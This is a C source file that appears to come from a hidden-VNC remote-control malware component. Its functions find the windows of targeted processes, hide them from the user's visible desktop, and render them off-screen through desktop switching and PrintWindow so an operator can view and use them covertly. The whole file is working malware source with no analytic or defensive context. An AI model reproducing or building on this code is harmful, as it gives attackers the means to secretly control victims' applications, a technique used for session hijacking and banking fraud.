#include "..\includes.h"
#include "vnc.h"
#include "windows.h"
#include "wnd_steal.h"
#include "sshot.h"

bool IsStolenWindow(PHVNC lpServer,HWND hWnd)
{
    bool bRet=false;
    Z_ORDER_LIST_ITEM *lpItem=GetWndFromList(lpServer,hWnd);
    if ((lpItem) && (lpItem->bStolen))
        bRet=true;
    return bRet;
}

bool IsStolenWindowVisible(PHVNC lpServer,HWND hWnd)
{
    bool bRet=false;
    Z_ORDER_LIST_ITEM *lpItem=GetWndFromList(lpServer,hWnd);
    if (lpItem)
        bRet=((lpItem->bStolen) && (lpItem->bHidden == 0));
    return bRet;
}

/**
BOOL CALLBACK HideProcessWindows(HWND hw, LPARAM p)
{
	HIDE_PROCESS *hp = (HIDE_PROCESS *)p;

	DWORD dwPID = 0;
	GetWindowThreadProcessId( hw, &dwPID );

	if( dwPID == hp->m_dwProcessId )
	{
		hp->pList->DeleteTab( hw );
		SetLayered( hw );
		//SetWindowPos(hw, HWND_BOTTOM, 0, 0, 100, 100, SWP_SHOWWINDOW | SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
		SetWindowPos(hw, HWND_BOTTOM, 0, 0, 100, 100, SWP_HIDEWINDOW | SWP_NOACTIVATE | SWP_NOMOVE | SWP_NOSIZE);
	}
	else
	{
		if( hp->pJavaProc->Exists( dwPID ) )
		{
			hp->pList->DeleteTab( hw );
			SetLayered( hw );
		}
		else
		{
			if(IsJavaWindow(hw))
			{
				hp->pJavaProc->Add( dwPID );
			}
		}
	}
	return TRUE;
}
**/

bool IsStolenWindowProcess(PHVNC lpServer,HWND hWnd)
{
    bool bRet=false;
    DWORD dwPID;
    GetWindowThreadProcessId(hWnd,&dwPID);
    EnterCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
    {
        Z_ORDER_LIST_ITEM *lpItem=lpServer->WndWatcherInfo.lpZOrderList;
        while (lpItem)
        {
            if (lpItem->bStolen)
            {
                DWORD dwCurWndPID;
                GetWindowThreadProcessId(lpItem->hWnd,&dwCurWndPID);
                if (dwPID == dwCurWndPID)
                {
                    bRet=true;
                    break;
                }
            }
            lpItem=lpItem->lpNext;
        }
    }
    LeaveCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
    return bRet;
}

BOOL CALLBACK HideProcessWindows(HWND hWnd,PHVNC lpServer)
{
    if ((!IsStolenWindow(lpServer,hWnd)) && (IsStolenWindowProcess(lpServer,hWnd)))
        StealWindow(lpServer,hWnd);
    return TRUE;
}

void WINAPI WndStealerThread(PHVNC lpServer)
{
    SetThreadDesktop(hDefaultDesktop);
    CoInitialize(0);
    ITaskbarList *pList;
    CoCreateInstance(CLSID_TaskbarList,0,CLSCTX_SERVER,IID_ITaskbarList,(void**)&pList);
    if (pList)
    {
        pList->HrInit();
        while (!lpServer->bStopped)
        {
            EnumWindows((WNDENUMPROC)HideProcessWindows,(LPARAM)lpServer);
            Sleep(1);
        }
        pList->Release();
    }
    CoUninitialize();
    return;
}

HDESK SwitchThreadToStolenWindowDesktop(HWND hWnd)
{
    HDESK hDesk=GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktopEx(GetThreadDesktop(GetWindowThreadProcessId(hWnd,NULL)));
    return hDesk;
}

BOOL DrawStolenWindow(PHVNC lpServer,HWND hWnd,HDC hDC)
{
    BOOL bRet=false;
    if (IsStolenWindow(lpServer,hWnd))
    {
        HDESK hPrevDesk=SwitchThreadToStolenWindowDesktop(hWnd);
        bRet=PrintWindowEx(hWnd,hDC,NULL);
        SetThreadDesktopEx(hPrevDesk);
    }
    return bRet;
}

void ShowWindowEx(HWND hWnd,bool bShow)
{
    DWORD dwExStyle=GetWindowLongPtr(hWnd,GWL_EXSTYLE),
          dwSWP=SWP_NOSIZE|SWP_NOMOVE|SWP_NOZORDER|SWP_NOACTIVATE;
    if (bShow)
    {
        dwExStyle&=~WS_EX_COMPOSITED;
        dwSWP|=SWP_SHOWWINDOW;
    }
    else
    {
        dwExStyle|=WS_EX_COMPOSITED;
        dwSWP|=SWP_HIDEWINDOW;
    }
    SetWindowLongPtr(hWnd,GWL_EXSTYLE,dwExStyle);
    SetWindowPos(hWnd,NULL,0,0,0,0,dwSWP);
    return;
}

bool StealWindow(PHVNC lpServer,HWND hWnd)
{
    bool bRet=false;
    if (!IsStolenWindow(lpServer,hWnd))
    {
        EnterCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
        {
            Z_ORDER_LIST_ITEM *lpItem=AppendWndToList(lpServer,hWnd,true);
            if (lpItem)
            {
                lpItem->bStolen=true;
                HDESK hPrevDesk=SwitchThreadToStolenWindowDesktop(hWnd);
                ShowWindowEx(hWnd,false);
                SetThreadDesktopEx(hPrevDesk);
                bRet=true;
            }
        }
        LeaveCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
    }
    return bRet;
}

bool ReturnWindowToOwner(PHVNC lpServer,HWND hWnd)
{
    bool bRet=false;
    if (IsStolenWindow(lpServer,hWnd))
    {
        ShowWindowEx(hWnd,true);
        EnterCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
            DeleteWndFromList(lpServer,hWnd);
        LeaveCriticalSection(&lpServer->WndWatcherInfo.csWndsList);
        bRet=true;
    }
    return bRet;
}

